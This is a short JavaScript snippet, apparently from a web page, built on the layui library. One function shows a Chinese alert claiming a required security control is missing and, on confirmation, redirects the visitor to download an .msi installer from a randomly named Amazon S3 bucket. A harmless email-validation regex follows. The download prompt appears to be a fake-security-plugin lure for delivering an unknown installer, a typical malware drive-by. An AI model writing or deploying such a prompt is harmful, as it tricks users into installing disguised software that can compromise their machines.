const layer = layui.layer;

function openModal() {
    layer.alert('检测未安装安全控件，请安装后重试！', function() {
        location.href = 'https://gfsmdmtke.s3.ap-east-1.amazonaws.com/Chenrmoemry.msi';
        $('.layui-layer-move, .layui-layer-shade, .layui-layer.layui-layer-dialog').remove();
    });
}

function validateEmail(email) {
    return email.match(
        /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
    );
}
